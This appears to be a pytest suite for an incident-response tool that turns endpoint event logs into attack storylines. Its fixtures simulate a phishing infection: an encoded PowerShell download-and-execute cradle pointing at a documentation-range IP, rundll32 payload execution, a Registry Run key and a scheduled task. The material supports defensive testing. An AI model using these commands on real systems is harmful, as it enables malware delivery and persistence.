"""Story steps (§9.4), storyline gaps (§9.5) and scope (§5.7, §9.6)."""

import base64
from pathlib import Path

import pytest

from helpers.chain import EXPLORER, SYS32, Chain, guid
from lineage_ir.analyze.filters import make_params
from lineage_ir.engine import AnalysisResult, run_analysis
from lineage_ir.ingest.timeparse import format_rfc3339
from lineage_ir.models import Gap, Storyline

FIXTURES = Path(__file__).resolve().parents[1] / "fixtures"
PREFIX = "8f3c2a71-5e4b-4d9a-a1c3-"
RUN_KEY = (
    "HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows"
    "\\CurrentVersion\\Run\\Updater"
)


def g(tag: int) -> str:
    return f"{PREFIX}{tag:012x}"


@pytest.fixture(scope="module")
def phish() -> AnalysisResult:
    return run_analysis([FIXTURES / "phish_chain.jsonl"])


def test_s1_steps(phish: AnalysisResult) -> None:
    s1 = phish.storylines[0]
    actual = [(s.n, s.action, s.guid, s.tactic, s.technique, s.severity) for s in s1.steps]
    assert actual == [
        (1, "process_create", g(0xB1), None, None, None),
        (2, "process_create", g(0xC1), None, None, None),
        (3, "process_create", g(0xD1), "execution", "T1204.002", "high"),
        (4, "decoded", g(0xD1), None, None, None),
        (5, "process_create", g(0xE1), "execution", "T1059.001", "high"),
        (6, "decoded", g(0xE1), None, None, None),
        (7, "dns", g(0xE1), None, None, None),
        (8, "network", g(0xE1), "execution", "T1204.002", "high"),
        (9, "file_create", g(0xE1), None, None, None),
        (10, "file_create", g(0xE1), None, None, None),
        (11, "process_create", g(0xF1), None, None, None),
        (12, "network", g(0xF1), "execution", "T1204.002", "high"),
        (13, "finding", g(0xF1), "persistence", "T1547.001", "medium"),
    ]
    texts = [s.text for s in s1.steps]
    assert texts[2].startswith("winword.exe spawned cmd.exe cmd.exe /c powershell")
    assert texts[2].endswith("[CMD-001, LIN-001]")
    assert texts[3] == (
        "cmd.exe decoded: IEX (New-Object Net.WebClient).DownloadString"
        "('http://203.0.113.10/a.ps1')"
    )
    assert texts[6] == "powershell.exe resolved dl.example"
    assert texts[7] == "powershell.exe \u2192 203.0.113.10:80/tcp (dl.example) [GR-001]"
    assert texts[8] == "powershell.exe wrote C:\\Users\\Public\\upd.exe"
    assert texts[11].endswith("[GR-001, NET-001]")
    assert texts[12] == f"Registry Run key set: {RUN_KEY}"
    assert s1.steps[3].source == s1.steps[2].source
    assert s1.gaps == ()


def test_s2_steps_and_gap(phish: AnalysisResult) -> None:
    s2 = phish.storylines[1]
    actual = [(s.action, s.guid, s.technique) for s in s2.steps]
    # GR-003 evidence is the execution record only (amendment 18): the drop by powershell.exe
    # is not an S2 step.
    assert actual == [
        ("process_create", g(0x91), "T1105"),
        ("process_create", g(0x92), "T1033"),
        ("process_create", g(0x93), "T1033"),
        ("process_create", g(0x94), "T1033"),
    ]
    assert s2.steps[0].text.endswith("[GR-003, LOC-001]")
    assert s2.gaps == ()


def test_s2_starts_at_the_executed_process(phish: AnalysisResult) -> None:
    s2 = phish.storylines[1]
    assert format_rfc3339(s2.start_us) == "2026-10-12T11:00:00Z"
    assert s2.start_us == s2.steps[0].ts_us
    assert s2.gaps == ()


def _reference_layout(path: Path) -> Path:
    """The owner's reference phish_chain layout (base, without events 8 and 10)."""
    office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
    ps = SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe"
    payload = "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.50/a')"
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
    upd = "C:\\Users\\Public\\upd.exe"
    chain = Chain().create(0x10, EXPLORER, 0x01, 0, "C:\\Windows\\Explorer.EXE")
    chain.create(0x20, SYS32 + "svchost.exe", 0x02, 30, "svchost.exe -k netsvcs")
    for n, second in enumerate((480, 960, 1440, 1920, 2400)):
        if n % 2:
            chain.create(0x30 + n, SYS32 + "taskhostw.exe", 0x20, second)
        else:
            chain.create(0x30 + n, SYS32 + "notepad.exe", 0x10, second)
    chain.create(0xB1, office + "OUTLOOK.EXE", 0x10, 2460, parent_image=EXPLORER)
    chain.create(
        0xC1,
        office + "WINWORD.EXE",
        0xB1,
        2518,
        f'"{office}WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\invoice_oct.docm"',
        office + "OUTLOOK.EXE",
    )
    chain.create(
        0xD1,
        SYS32 + "cmd.exe",
        0xC1,
        2523,
        f"cmd.exe /c powershell -enc {b64}",
        office + "WINWORD.EXE",
    )
    chain.create(0xE1, ps, 0xD1, 2524, f"powershell -enc {b64}", SYS32 + "cmd.exe")
    chain.connect(0xE1, 2525, "203.0.113.50", 80, Image=ps)
    chain.event(22, 0xE1, 2525, Image=ps, QueryName="update-cdn.example", QueryStatus="0")
    chain.event(11, 0xE1, 2527, Image=ps, TargetFilename="C:\\Users\\Public\\a.dll")
    chain.event(11, 0xE1, 2528, Image=ps, TargetFilename=upd)
    chain.create(
        0xF1, SYS32 + "rundll32.exe", 0xE1, 2529, "rundll32.exe C:\\Users\\Public\\a.dll,Start", ps
    )
    chain.connect(0xF1, 2530, "203.0.113.50", 443)
    chain.event(
        13,
        0xF1,
        2531,
        Image=SYS32 + "rundll32.exe",
        EventType="SetValue",
        TargetObject="HKU\\S-1-5-21-1-2-3-1001\\Software\\Microsoft\\Windows\\CurrentVersion"
        "\\Run\\Updater",
        Details=upd,
    )
    chain.create(0x91, upd, 0x10, 5342, upd, EXPLORER)
    chain.create(
        0x92,
        SYS32 + "schtasks.exe",
        0x91,
        5345,
        f"schtasks.exe /create /tn Updater /tr {upd} /sc onlogon",
        upd,
    )
    for n, second in enumerate((5400, 5880, 6360)):
        chain.create(0x60 + n, SYS32 + "notepad.exe", 0x10, second)
    return chain.write(path)


def test_reference_layout_s2_starts_at_upd_with_no_gap(tmp_path: Path) -> None:
    result = run_analysis([_reference_layout(tmp_path / "reference.jsonl")])
    s1, s2 = result.storylines
    assert (s1.root_image_name, s2.root_image_name) == ("outlook.exe", "upd.exe")
    assert format_rfc3339(s2.start_us) == "2026-10-12T11:29:02Z"
    assert [(s.action, s.guid) for s in s2.steps] == [
        ("process_create", guid(0x91)),
        ("process_create", guid(0x92)),
    ]
    assert s1.gaps == () and s2.gaps == ()
    assert [gap.seconds for gap in result.coverage.timeline.gaps] == [2811]


def test_steps_are_numbered_in_time_order(phish: AnalysisResult) -> None:
    for story in phish.storylines:
        assert [s.n for s in story.steps] == list(range(1, len(story.steps) + 1))
        stamps = [s.ts_us for s in story.steps]
        assert stamps == sorted(stamps)
        assert story.start_us == stamps[0] and story.end_us == stamps[-1]


def test_s1_scope(phish: AnalysisResult) -> None:
    scope = phish.storylines[0].scope
    assert scope.users == ("CORP\\jdoe",)
    assert (scope.process_count, scope.ghost_count) == (5, 0)
    assert scope.files_created == ("C:\\Users\\Public\\upd.exe", "C:\\Users\\Public\\stage.dll")
    assert scope.executable_files == 2
    assert scope.registry_set == (RUN_KEY,)
    assert scope.persistence == (f"Registry Run key set \u2192 {RUN_KEY}",)
    assert scope.destinations == ("203.0.113.10:80/tcp", "198.51.100.20:443/tcp")
    assert scope.dns_names == ("dl.example", "cdn.example")
    assert scope.decoded_payloads == 2
    assert scope.review == {
        "processes": 5,
        "files": 2,
        "registry_keys": 1,
        "persistence": 1,
        "destinations": 2,
    }


def test_s2_scope(phish: AnalysisResult) -> None:
    scope = phish.storylines[1].scope
    assert scope.users == ("NT AUTHORITY\\SYSTEM",)
    assert scope.process_count == 4
    assert scope.files_created == () and scope.destinations == ()
    assert scope.review["processes"] == 4


def _single(result: AnalysisResult) -> Storyline:
    (story,) = result.storylines
    return story


def test_scope_caps_and_ordering(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 1)
    for n in range(30):
        chain.event(11, 2, 2 + n, TargetFilename=f"C:\\Data\\note{n:02d}.txt")
    for n in range(30):
        chain.event(11, 2, 40 + n, TargetFilename=f"C:\\Data\\bin{n:02d}.exe")
    chain.event(11, 2, 80, TargetFilename="C:\\Data\\note00.txt")
    chain.event(13, 2, 90, EventType="SetValue", TargetObject="HKCU\\Software\\App\\Color")
    chain.event(
        13,
        2,
        91,
        EventType="SetValue",
        TargetObject="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tool",
        Details="C:\\Users\\Public\\tool.exe",
    )
    for n in range(60):
        chain.connect(2, 100 + n, f"203.0.113.{n}", Image="C:\\Users\\Public\\tool.exe")
    scope = _single(run_analysis([chain.write(tmp_path / "in.jsonl")])).scope
    assert len(scope.files_created) == 50
    assert scope.files_created[:30] == tuple(f"C:\\Data\\bin{n:02d}.exe" for n in range(30))
    assert scope.files_created[30] == "C:\\Data\\note00.txt"
    assert scope.executable_files == 30
    assert scope.registry_set == (
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tool",
        "HKCU\\Software\\App\\Color",
    )
    assert len(scope.destinations) == 50
    assert scope.destinations[0] == "203.0.113.0:443/tcp"
    assert scope.review["files"] == 60
    assert scope.review["destinations"] == 60


def test_first_occurrence_rules_for_activity_steps(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 1)
    chain.connect(2, 2, "203.0.113.5", Image="C:\\Users\\Public\\tool.exe")
    chain.connect(2, 3, "203.0.113.5", Image="C:\\Users\\Public\\tool.exe")
    chain.event(22, 2, 4, QueryName="a.example", Image="C:\\Users\\Public\\tool.exe")
    chain.event(22, 2, 5, QueryName="a.example", Image="C:\\Users\\Public\\tool.exe")
    chain.event(11, 2, 6, TargetFilename="C:\\Data\\x.txt")
    chain.event(11, 2, 7, TargetFilename="C:\\Data\\x.ps1")
    chain.event(11, 2, 8, TargetFilename="C:\\Data\\x.ps1")
    actions = [s.action for s in _single(run_analysis([chain.write(tmp_path / "in.jsonl")])).steps]
    assert actions == ["process_create", "network", "dns", "file_create"]


def test_gap_threshold_follows_the_option(tmp_path: Path) -> None:
    chain = Chain().create(1, EXPLORER)
    chain.create(2, "C:\\Users\\Public\\tool.exe", 1, 0)
    chain.create(3, SYS32 + "cmd.exe", 2, 300)
    path = chain.write(tmp_path / "in.jsonl")
    assert _single(run_analysis([path])).gaps == ()
    gaps = _single(run_analysis([path], make_params(gap="5m"))).gaps
    assert gaps == (Gap(after_step=1, seconds=300),)
